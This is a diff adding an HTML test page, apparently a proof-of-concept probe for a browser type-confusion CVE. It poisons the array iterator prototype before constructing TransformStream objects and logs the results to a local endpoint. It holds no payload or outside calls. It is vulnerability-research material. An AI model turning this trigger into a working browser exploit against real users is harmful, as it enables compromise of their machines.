@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CVE Precise</title></head>
+<body>
+<script>
+function report(m) {
+    try { var x = new XMLHttpRequest(); x.open('GET','/log?m='+encodeURIComponent(m),false); x.send(); } catch(e) {}
+}
+
+report('=== PRECISE TEST START ===');
+
+// Test A: Normal TransformStream (no poison)
+report('A: normal TransformStream...');
+try {
+    var a = new TransformStream();
+    report('A: PASS - normal works');
+    a = null;
+} catch(e) {
+    report('A: FAIL - ' + e.constructor.name + ': ' + e.message);
+}
+
+// Test B: Just poison iterator, NO TransformStream
+var orig = Array.prototype[Symbol.iterator];
+report('B: poison iterator only (no TransformStream)...');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        return { next: function() { return {done:true}; } };
+    };
+    // Just verify iterator is poisoned - don't create TransformStream
+    var testArr = [1,2,3];
+    var iter = testArr[Symbol.iterator]();
+    var first = iter.next();
+    report('B: poisoned iterator returned: ' + JSON.stringify(first));
+    if (first.value === 1) {
+        report('B: FAIL - iterator NOT poisoned (normal behavior)');
+    } else {
+        report('B: iterator IS poisoned (good)');
+    }
+} catch(e) {
+    report('B: EXCEPTION - ' + e.constructor.name + ': ' + e.message);
+}
+Array.prototype[Symbol.iterator] = orig;
+
+// Test C: Poisioned iterator + TransformStream with try/catch
+report('C: poisoned iterator + TransformStream...');
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        var a = this, i = 0;
+        return { next: function() {
+            if (i >= a.length) return {done:true};
+            var v = a[i];
+            if (a.length === 3 && i >= 1) v = {fake:true};
+            i++;
+            return {value:v, done:false};
+        }};
+    };
+    report('C: about to call new TransformStream()...');
+    var c = new TransformStream();
+    report('C: PASS - survived type confusion!');
+    c = null;
+} catch(e) {
+    report('C: EXCEPTION - ' + e.constructor.name + ': ' + e.message);
+}
+Array.prototype[Symbol.iterator] = orig;
+
+report('=== PRECISE TEST END ===');
+document.write('Check /readlog for results');
+</script>
+</body>
+</html>
